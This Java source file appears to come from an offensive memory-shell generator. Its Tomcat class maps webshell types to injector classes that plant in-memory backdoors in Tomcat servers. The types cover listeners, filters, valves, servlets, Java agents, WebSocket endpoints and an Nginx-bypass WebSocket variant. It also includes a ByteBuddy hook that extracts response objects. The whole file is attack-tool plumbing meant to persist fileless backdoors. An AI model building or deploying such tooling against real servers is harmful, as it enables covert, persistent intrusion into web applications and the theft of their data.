package com.reajason.javaweb.memshell.server.tomcat;

import com.reajason.javaweb.memshell.config.InjectorConfig;
import com.reajason.javaweb.memshell.config.ShellConfig;
import com.reajason.javaweb.memshell.config.ShellToolConfig;
import com.reajason.javaweb.memshell.server.AbstractServer;
import com.reajason.javaweb.memshell.server.InjectorMapping;

import com.reajason.javaweb.utils.ShellCommonUtil;
import net.bytebuddy.asm.Advice;

import static com.reajason.javaweb.memshell.ShellType.*;

/**
 * @author ReaJason
 * @since 2024/11/22
 */
public class Tomcat extends AbstractServer {

    public static class ListenerInterceptor {

        @Advice.OnMethodExit
        public static void enter(@Advice.Argument(0) Object request, @Advice.Return(readOnly = false) Object response) throws Exception {
            try {
                response = ShellCommonUtil.getFieldValue(ShellCommonUtil.getFieldValue(request, "request"), "response");
            } catch (Exception e) {
                response = ShellCommonUtil.getFieldValue(request, "response");
            }
        }
    }

    @Override
    public Class<?> getListenerInterceptor() {
        return ListenerInterceptor.class;
    }

    /**
     * BypassNginx WebSocket 马需要配套一个前置 Valve helper（触发头命中时完成 upgrade 握手）
     */
    @Override
    public byte[] postProcessShellBytes(byte[] shellBytes, ShellConfig shellConfig,
                                        ShellToolConfig shellToolConfig, InjectorConfig injectorConfig) {
        String shellType = shellConfig.getShellType();
        if (BYPASS_NGINX_WEBSOCKET.equals(shellType) || JAKARTA_BYPASS_NGINX_WEBSOCKET.equals(shellType)) {
            String helperClassName = shellToolConfig.getShellClassName() + "$1";
            injectorConfig.setInjectorHelperClassName(helperClassName);
            injectorConfig.setHelperClassBytes(WebSocketByPassHelperGenerator.getBytes(helperClassName, shellConfig, shellToolConfig));
        }
        return shellBytes;
    }

    @Override
    public InjectorMapping getShellInjectorMapping() {
        return InjectorMapping.builder()
                .addInjector(LISTENER, "com.reajason.javaweb.memshell.injector.tomcat.TomcatListenerInjector")
                .addInjector(JAKARTA_LISTENER, "com.reajason.javaweb.memshell.injector.tomcat.TomcatListenerInjector")
                .addInjector(FILTER, "com.reajason.javaweb.memshell.injector.tomcat.TomcatFilterInjector")
                .addInjector(JAKARTA_FILTER, "com.reajason.javaweb.memshell.injector.tomcat.TomcatFilterInjector")
                .addInjector(VALVE, "com.reajason.javaweb.memshell.injector.tomcat.TomcatValveInjector")
                .addInjector(JAKARTA_VALVE, "com.reajason.javaweb.memshell.injector.tomcat.TomcatValveInjector")
                .addInjector(PROXY_VALVE, "com.reajason.javaweb.memshell.injector.tomcat.TomcatProxyValveInjector")
                .addInjector(JAKARTA_PROXY_VALVE, "com.reajason.javaweb.memshell.injector.tomcat.TomcatProxyValveInjector")
                .addInjector(SERVLET, "com.reajason.javaweb.memshell.injector.tomcat.TomcatServletInjector")
                .addInjector(JAKARTA_SERVLET, "com.reajason.javaweb.memshell.injector.tomcat.TomcatServletInjector")
                .addInjector(AGENT_FILTER_CHAIN, "com.reajason.javaweb.memshell.injector.tomcat.TomcatFilterChainAgentInjector")
                .addInjector(CATALINA_AGENT_CONTEXT_VALVE, "com.reajason.javaweb.memshell.injector.tomcat.TomcatContextValveAgentInjector")
                .addInjector(WEBSOCKET, "com.reajason.javaweb.memshell.injector.tomcat.TomcatWebSocketInjector")
                .addInjector(JAKARTA_WEBSOCKET, "com.reajason.javaweb.memshell.injector.tomcat.TomcatWebSocketInjector")
                .addInjector(BYPASS_NGINX_WEBSOCKET, "com.reajason.javaweb.memshell.injector.tomcat.TomcatWebSocketByPassInjector")
                .addInjector(JAKARTA_BYPASS_NGINX_WEBSOCKET, "com.reajason.javaweb.memshell.injector.tomcat.TomcatWebSocketByPassInjector")
                .addInjector(UPGRADE, "com.reajason.javaweb.memshell.injector.tomcat.TomcatUpgradeInjector")
                .build();
    }
}
